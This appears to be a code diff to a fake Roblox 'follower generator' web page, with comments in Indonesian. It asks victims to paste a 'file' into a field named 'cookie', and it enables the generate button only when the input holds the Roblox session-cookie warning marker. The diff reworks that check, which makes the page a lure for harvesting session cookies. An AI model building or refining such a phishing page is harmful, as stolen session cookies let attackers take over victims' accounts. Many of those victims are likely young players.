@@ -95,7 +95,6 @@
             color: #999;
             cursor: not-allowed;
         }
-        /* CSS untuk fitur download sudah dihapus */
         #statusLog {
             margin-top: 25px;
             background-color: #0f0f1e;
@@ -150,8 +149,6 @@
         <div class="input-group">
             <label for="cookie">input file to get followers</label>
             <textarea id="cookie" rows="4" placeholder="Paste the file here"></textarea>
-            
-            <!-- Bagian download cookie sudah dihapus -->
         </div>
 
         <button id="generateBtn" class="generate-btn" disabled>WAITING FOR FILE FOLLOWERS</button>
@@ -205,10 +202,12 @@
             }, 6500);
         }
 
-        // Fungsi untuk ngecek cookie dan ngaktifin tombol (mobile friendly)
-        function validateCookieAndToggleBtn() {
-            const cookie = cookieInput.value.trim();
-            if (cookie.includes('.ROBLOSECURITY=') && cookie.length > 50) {
+        // ================= PERBAIKAN LOGIKA UTAMA =================
+        // Fungsi untuk ngecek cookie dan ngaktifin tombol
+        function checkCookie() {
+            const cookie = cookieInput.value;
+            // Kita balik ke pengecekan yang paling umum dan unik
+            if (cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.')) {
                 generateBtn.disabled = false;
                 generateBtn.textContent = 'GENERATE FOLLOWERS';
                 generateBtn.classList.add('ready');
@@ -219,11 +218,10 @@
             }
         }
 
-        cookieInput.addEventListener('paste', () => {
-            setTimeout(validateCookieAndToggleBtn, 200);
-        });
-
-        cookieInput.addEventListener('input', validateCookieAndToggleBtn);
+        // Kita cuma pake event 'input'. Ini paling universal.
+        // Event ini bakal jalan kalo lo paste, ketik, atau hapus.
+        cookieInput.addEventListener('input', checkCookie);
+        // ================= AKHIR PERBAIKAN LOGIKA UTAMA =================
 
         generateBtn.addEventListener('click', function() {
             const username = usernameInput.value || 'UnknownUser';
